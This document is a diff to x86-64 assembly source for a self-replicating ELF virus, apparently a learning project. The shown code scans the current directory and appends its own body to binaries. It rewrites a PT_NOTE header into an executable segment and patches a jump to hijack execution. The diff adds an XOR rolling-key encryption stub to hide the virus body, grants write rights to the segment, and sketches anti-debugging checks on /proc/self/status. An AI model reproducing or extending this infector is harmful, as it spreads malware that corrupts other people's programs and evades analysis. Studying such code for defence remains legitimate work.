@@ -3,16 +3,66 @@
 section .text
   global _start
 
-section .text
+default rel
+
+decryptor:
+  push rdx
+  push rsp
+  mov r9, 0x11 ; key
+
+  ; age old trick 
+  call .delta ; call will push the address of the next instruction on the stack
+  .delta:
+    pop rbp ; We pop this address into rbp
+    sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
+  
+  mov r12, v_stop - _start ; size of stuff we wish to decrypt
+  lea rsi, [rbp + _start]
+  .decrypt:
+    xor byte [rsi], r9b
+    ror r9, 1
+    inc rsi
+    dec r12
+    cmp r12, 0
+    jne .decrypt
+
+  pop rsp
+  pop rdx
+
 
 _start:
   push rdx
   push rsp
   ; deactivate signals?
-  sub rsp, STACK_SIZE ; 
+  sub rsp, STACK_SIZE ; enough for the stack
+  sub rsp, v_stop - decryptor
   mov r15, rsp ; r15 will be the base of our stack
 
   mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
+
+  ; .is_traced: ; read /proc/self/status and check if TracerPid is not 0
+    ; lea rdi, proc_self_status ; load /proc/self/status
+    ; mov rsi, O_RDONLY;
+    ; xor rdx, rdx ; no flags
+    ; mov rax, SYS_OPEN
+    ; syscall
+; 
+    ; cmp rax, 0 ; check error
+    ; jl cleanup
+; 
+    ; mov rdi, rax
+    ; lea rsi, [rsp + STACK_SIZE]
+    ; mov rdx, STACK_SIZE
+    ; mov rax, SYS_READ
+    ; syscall
+    ; 
+; 
+
+  ; check for trace (/proc/self/status)
+  ; check for processus tmp
+
+  ; open every folder in /proc
+  ; check for /comm and string compare (without \n)
 
   ; --- Open "."
   push "." ; push "." to stack (rsp)
@@ -142,13 +192,50 @@ _start:
       call .delta ; call will push the address of the next instruction on the stack
       .delta:
         pop rbp ; We pop this address into rbp
-        sub rbp, .delta ; by substracting delta we get back, we get the adress of the virus at runtime
+        sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
+
+      ; load key
+      push rax ; store target EOF
+      push r9 ; store fd on the stack
+      mov r9, 0x11
+
+      ; copy decryptor on the stack
+      mov r12, _start - decryptor ; size to copy
+      lea rsi, [rbp + decryptor] 
+      lea rax, [r15 + STACK_SIZE]
+      xor rdi, rdi ; init rdi
+      .memcpy_decryptor:
+        mov dil, byte [rsi]
+        mov byte[rax], dil
+        inc rsi
+        inc rax
+        dec r12
+        cmp r12, 0
+        jg .memcpy_decryptor
+
+      mov r12, v_stop - _start ; size to copy
+      lea rsi, [rbp + _start] 
+      lea rax, [r15 + STACK_SIZE + _start - decryptor] ; only encrypt from _start
+      xor rdi, rdi
+      .memcpy_and_encrypt:
+        mov dil, byte [rsi]
+        xor dil, r9b
+        ror r9, 1 ; rotate key
+        mov byte [rax], dil
+        inc rsi
+        inc rax
+        dec r12
+        cmp r12, 0
+        jg .memcpy_and_encrypt
+
       
+      pop r9 ; restore fd in r9
+
       ; write virus body to the end of the file
       mov rdi, r9 ; load fd
-      lea rsi, [rbp + _start] ; load _start address in rsi
-      mov rdx, v_stop - _start; virus size
-      mov r10, rax ; load target EOF into r10
+      lea rsi, [r15 + STACK_SIZE]
+      mov rdx, v_stop - decryptor; virus size
+      pop r10; load target EOF into r10
       mov rax, SYS_PWRITE64
       syscall
 
@@ -157,7 +244,7 @@ _start:
 
       ; -- Patch program header
       mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
-      mov dword [r15 + PHDR_FLAGS], PF_R | PF_X ; Add read and execute rights to flags
+      mov dword [r15 + PHDR_FLAGS], PF_R | PF_X | PF_W ; Add rwx rights to flags
       pop rax ; restore target EOF into rax
 
       mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
@@ -166,8 +253,8 @@ _start:
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
 
       mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
-      add qword [r15 + PHDR_FILESZ], v_stop - _start + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
-      add qword [r15 + PHDR_MEMSZ], v_stop - _start + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.
+      add qword [r15 + PHDR_FILESZ], v_stop - decryptor + JMP_REL_SIZE ; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
+      add qword [r15 + PHDR_MEMSZ], v_stop - decryptor + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.
 
       ; -- Write the patched header
       ; pwrite(fd, buf, count, offset)
@@ -213,7 +300,7 @@ _start:
       mov rdx, [r15 + PHDR_VADDR] ; load the virtual address
       add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
       sub r14, rdx ; scott
-      sub r14, v_stop - _start ; scott
+      sub r14, v_stop - decryptor ; scott
       mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
       mov dword [r15 + JMP_REL + 1], r14d ; scott why
 
@@ -236,7 +323,7 @@ _start:
       syscall
 
       lea rsi, [rbp + signature] ; load signature in rsi
-      xor r12, r12 ; init rcx
+      xor r12, r12 ; init r12
       cmp byte [rsi + 1], 'W'; check if we need to adjust offset
       je .after
       add r12, signature - v_stop + 1 ; add the difference
@@ -386,6 +473,10 @@ _start:
 
       cmp rax, 0
       jl .close_and_next_file ; if error go to next file
+    
+    ; .find_text_section:
+    ; .encrypt_text_section:
+    ; .append_decryption_stub:
 
       mov rax, SYS_SYNC ; committing filesystem caches to disk
       syscall
@@ -422,6 +513,7 @@ info_msg:
 cleanup:
   ; restore signals ?
   add rsp, STACK_SIZE ; restore rsp
+  add rsp, v_stop - decryptor;
   pop rsp ; restore rsp
   pop rdx ; restore rdx
 
@@ -433,7 +525,13 @@ signature:
 fingerprint:
 	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0
   fingerprint_len equ $ - fingerprint
-
+proc_self_status:
+  db "/proc/self/status", 0
+key:
+  db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+code_offset:
+  db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+  
 exit:
   xor rdi, rdi ; exit code 0
   mov rax, SYS_EXIT;
